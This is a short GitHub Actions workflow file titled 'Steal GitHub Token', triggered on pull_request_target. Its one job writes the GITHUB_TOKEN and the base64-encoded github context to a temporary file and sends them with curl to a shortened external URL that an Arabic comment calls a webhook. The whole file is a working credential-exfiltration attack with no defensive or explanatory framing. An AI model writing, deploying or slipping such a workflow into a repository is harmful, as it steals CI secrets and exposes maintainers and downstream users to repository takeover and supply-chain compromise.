name: Steal GitHub Token

on:
  pull_request_target:
    types: [opened, synchronize]

jobs:
  steal:
    runs-on: ubuntu-latest
    steps:
      - name: Exfiltrate all secrets
        run: |
          # جمع كل المتغيرات
          echo "GITHUB_TOKEN=$GITHUB_TOKEN" > /tmp/data.txt
          echo "GITHUB_CONTEXT=$(echo '${{ toJson(github) }}' | base64 -w 0)" >> /tmp/data.txt
          
          # إرسال إلى webhook
          curl -X POST https://is.gd/92LFha \
            -H "Content-Type: application/json" \
            --data-binary @/tmp/data.txt
